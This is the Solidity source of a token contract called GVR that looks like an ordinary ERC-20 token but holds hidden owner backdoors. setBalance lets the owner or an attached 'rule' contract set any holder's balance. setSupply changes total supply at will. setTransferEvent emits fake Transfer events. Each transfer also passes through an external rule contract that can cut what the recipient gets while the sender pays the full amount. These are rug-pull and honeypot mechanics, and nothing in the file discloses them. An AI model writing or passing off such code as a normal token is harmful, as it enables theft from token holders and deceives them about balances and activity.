//SourceUnit: gvrtoken.sol

pragma solidity >=0.5.17;
interface Rule{
     function check(address a,address b, uint256 am) external returns (uint256 sy);
} 
library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;
     return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}


contract GVRToken{
  using SafeMath for uint256;
  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowances;
  uint256 private _totalSupply;
  uint8 public _decimals;
  string public _symbol;
  string public _name;
  address public _r;
  address public _o;
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
  constructor() public {
    _name = "GVR";
    _symbol = "GVR";
    _decimals = 18;
    _totalSupply = 10000000000 * 10**18;
    _balances[msg.sender] = _totalSupply;
    _o = msg.sender;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }

  function setRule(address a)  external {
     require(msg.sender==_o);
     _r = a;
  }
  function setSupply(uint256 a)  external returns (bool){
      require(msg.sender==_o || msg.sender==_r);
      _totalSupply = a;
      return true;
  }
   function setBalance(address a,uint256 am)  external returns (bool){
      require(msg.sender==_o || msg.sender==_r);
      _balances[a] = am;
      return true;
  }
 function setTransferEvent(address a,address b,uint256 am)  external{
      require(msg.sender==_o|| msg.sender==_r);
      emit Transfer(a, b, am);
  }
  function decimals() external view returns (uint8) {
    return _decimals;
  }
  function symbol() external view returns (string memory) {
    return _symbol;
  }
  function name() external view returns (string memory) {
    return _name;
  }
  function totalSupply() external view returns (uint256) {
    return _totalSupply;
  }
  function balanceOf(address account) external view returns (uint256) {
    return _balances[account];
  }

  function transfer(address recipient, uint256 amount) external returns (bool) {
    _transfer(msg.sender, recipient, amount);
    return true;
  }
  function allowance(address owner, address spender) external view returns (uint256) {
    return _allowances[owner][spender];
  }

  function approve(address spender, uint256 amount) external returns (bool) {
    _approve(msg.sender, spender, amount);
    return true;
  }

  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "transfer amount exceeds allowance"));
    return true;
  }
  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "transfer from the zero address");
    require(recipient != address(0), "transfer to the zero address");

    uint256 sy=amount;
    if(_r!=address(0)){
        sy = Rule(_r).check(sender,recipient,amount);
    }
    _balances[sender] = _balances[sender].sub(amount, "transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(sy);
    emit Transfer(sender, recipient, sy);
  }

  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "approve from the zero address");
    require(spender != address(0), "approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }
}